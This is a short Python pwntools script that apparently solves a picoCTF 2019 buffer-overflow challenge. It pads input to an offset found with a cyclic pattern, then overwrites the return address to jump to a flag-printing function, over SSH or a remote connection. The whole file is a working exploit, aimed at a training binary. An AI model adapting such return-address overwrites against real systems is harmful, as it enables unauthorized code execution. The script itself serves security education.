from pwn import *
import sys

host = '2019shell1.picoctf.com'
user = ''
password = ''
cwd = '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a'

def exploit(s):
    func_flag_addr = 0x00400767
    main_addr = 0x004007e8
    payload = cyclic(100)
    x = payload.find('qaaaraaa')
    print (x)
    payload = b'A' * (x + 8) + p64(main_addr) + p64(func_flag_addr)
    print (payload)

    s.sendlineafter(': ', payload)
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        ssh = ssh(host = host, user = user, password = password)
        ssh.set_working_directory(cwd)
        s = ssh.process('./vuln')
        input('PAUSED')
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
